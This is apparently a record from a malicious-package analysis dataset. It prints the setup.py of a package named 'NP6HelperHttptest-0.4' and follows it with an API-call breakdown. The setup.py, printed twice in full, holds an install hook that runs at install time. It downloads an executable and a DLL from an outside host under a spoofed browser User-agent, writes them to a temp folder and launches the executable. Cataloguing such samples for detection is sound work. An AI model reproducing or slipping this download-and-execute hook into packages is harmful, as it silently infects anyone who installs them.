[
  {
    "pyfile": "setup.py",
    "code_snippet": "import os\nimport tempfile\nfrom urllib.request import Request, urlopen\nfrom setuptools.command.install import install\n\nclass ActionOnInstall(install):\n     def run(self):\n        temp_dir = tempfile.mkdtemp(prefix='DriverGenius')\n        dname = temp_dir\n        def dfile(url):\n            requestObj = Request(url, headers={'User-agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0'})\n            responseObj = urlopen(requestObj)\n            content = responseObj.read()\n            return content\n        r = dfile(\"https://fus.rngupdatem.buzz/c.exe\")\n        rd = dfile(\"https://fus.rngupdatem.buzz/dgdeskband64.dll\")\n        with open(dname+\"\\\\ComServer.exe\",'wb') as f:\n            f.write(r)\n        with open(dname+\"\\\\dgdeskband64.dll\",'wb') as f:\n            f.write(rd)\n        os.system(\"START \" +dname+\"\\\\ComServer.exe showdeskband\")",
    "pattern_analysis": {
      "api_sequence": [
        "tempfile.mkdtemp",
        "urllib.request.Request",
        "urllib.request.urlopen",
        "http.client.HTTPResponse.read",
        "urllib.request.Request",
        "urllib.request.urlopen",
        "http.client.HTTPResponse.read",
        "open",
        "io.BufferedWriter.write",
        "open",
        "io.BufferedWriter.write",
        "os.system"
      ],
      "api_sequence_with_args": [
        "tempfile.mkdtemp(prefix='DriverGenius')",
        "urllib.request.Request(url, headers={'User-agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0'})",
        "urllib.request.urlopen(requestObj)",
        "responseObj.read()",
        "urllib.request.Request(url, headers={'User-agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0'})",
        "urllib.request.urlopen(requestObj)",
        "responseObj.read()",
        "open(dname+\"\\ComServer.exe\", 'wb')",
        "f.write(r)",
        "open(dname+\"\\dgdeskband64.dll\", 'wb')",
        "f.write(rd)",
        "os.system(\"START \" + dname + \"\\ComServer.exe showdeskband\")"
      ],
      "mapped_sequence": [
        {
          "api_name": "tempfile.mkdtemp",
          "id": "create_temp_dir",
          "description": "Creates temporary directory and returns its path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "urllib.request.Request",
          "id": "create_http_request",
          "description": "Creates HTTP request object with specified URL, data, and headers",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_creation"
        },
        {
          "api_name": "urllib.request.urlopen",
          "id": "open_url_get",
          "description": "Opens URL with GET parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "http.client.HTTPResponse.read",
          "id": "read_response_body",
          "description": "Reads response body from HTTP response",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "urllib.request.Request",
          "id": "create_http_request",
          "description": "Creates HTTP request object with specified URL, data, and headers",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_creation"
        },
        {
          "api_name": "urllib.request.urlopen",
          "id": "open_url_get",
          "description": "Opens URL with GET parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "http.client.HTTPResponse.read",
          "id": "read_response_body",
          "description": "Reads response body from HTTP response",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "io.BufferedWriter.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "io.BufferedWriter.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        }
      ],
      "contextual_code": "import os\nimport tempfile\nfrom urllib.request import Request, urlopen\n\nclass ActionOnInstall(install):\n     def run(self):\n        temp_dir = tempfile.mkdtemp(prefix='DriverGenius')\n        dname = temp_dir\n        def dfile(url):\n            requestObj = Request(url, headers={'User-agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0'})\n            responseObj = urlopen(requestObj)\n            content = responseObj.read()\n            return content\n        r = dfile(\"https://fus.rngupdatem.buzz/c.exe\")\n        rd = dfile(\"https://fus.rngupdatem.buzz/dgdeskband64.dll\")\n        with open(dname+\"\\ComServer.exe\",'wb') as f:\n            f.write(r)\n        with open(dname+\"\\dgdeskband64.dll\",'wb') as f:\n            f.write(rd)\n        os.system(\"START \" +dname+\"\\ComServer.exe showdeskband\")"
    }
  },
  {
    "metadata": {
      "package_name": "NP6HelperHttptest-0.4"
    }
  }
]